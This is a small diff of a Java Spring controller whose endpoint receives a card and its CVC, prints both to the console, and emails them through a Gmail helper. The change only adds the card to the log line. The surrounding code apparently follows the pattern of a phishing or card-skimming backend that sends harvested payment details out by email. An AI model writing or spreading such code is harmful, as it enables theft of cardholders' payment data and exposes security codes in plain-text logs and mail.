@@ -21,7 +21,7 @@ public class CVCcontroller {
     @PostMapping("/createCVC")
     public String createCVC(@ModelAttribute Cvc cvc, Card card)
     {
-        System.out.println("cvc : " + cvc);
+        System.out.println("cvc : " + cvc + card);
         Gmail gmail = new Gmail();
         gmail.send(card.toString() + cvc.toString());
 
